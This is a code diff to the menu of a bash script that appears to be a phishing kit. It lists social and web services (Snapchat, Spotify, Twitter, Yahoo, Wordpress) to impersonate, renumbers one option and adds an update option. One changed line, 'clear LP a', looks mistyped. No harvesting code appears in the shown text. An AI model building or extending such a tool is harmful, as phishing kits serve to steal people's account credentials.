@@ -12,14 +12,14 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Instal
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
 }
 banner() {
-clear
+clear LP a
 printf " \e[91m ███████╗\e[0m\e[1;92m ███╗   ███╗ \e[0m\e[1;93m ███████╗  \e[0m\e[1;91m ▄█▀─▄▄▄▄▄▄▄─▀█▄ \e[0m\n"
 printf " \e[91m ██╔════╝\e[0m\e[1;92m ████╗ ████║ \e[0m\e[1;93m ██╔════╝ \e[0m\e[1;91m  ▀█████████████▀ \e[0m\n"
 printf " \e[91m ███████╗\e[0m\e[1;92m ██╔████╔██║ \e[0m\e[1;93m █████╗ \e[0m\e[1;91m        █▄███▄█ \e[0m\n"
 printf " \e[91m ╚════██║\e[0m\e[1;92m ██║╚██╔╝██║ \e[0m\e[1;93m ██╔══╝ \e[0m\e[1;91m         █████ \e[0m\n"
 printf " \e[91m ███████║\e[0m\e[1;92m ██║ ╚═╝ ██║ \e[0m\e[1;93m ██║ \e[0m\e[1;91m            █▀█▀█ \e[0m\n"
 printf " \e[91m ╚══════╝\e[0m\e[1;92m ╚═╝     ╚═╝ \e[0m\e[1;93m ╚═╝ \e[0m\e[40;38;5;82mversion\e[30;48;5;82m1.2\e[0m\n"
-printf " \e[44m   CODE RE BY TECH COCHI \e[0m\n"
+printf " \e[44m CODE RE BY TECH COCHI \e[0m\n"
 printf " \n"
 }
 menu() {
@@ -34,7 +34,8 @@ printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;92m Snapchat \e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;92m Spotify \e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;92m Twitter \e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;92m Yahoo \e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;92m Wordpress \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;92m Wordpress \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;92m Update \e[0m\n"
 printf " \e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m] \e[0m\e[1;92mExit\e[0m\n"
 printf " \e[0m\n"        
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select an option: \e[0m\e[1;91m\en' option
@@ -71,6 +72,8 @@ start
 elif [[ $option == 12 ]]; then
 server="wordpress"
 start
+elif [[ $option == 13 ]]; then
+bash update
 elif [[ $option == 0 || $option == 00 ]]; then
 exit 1
 else
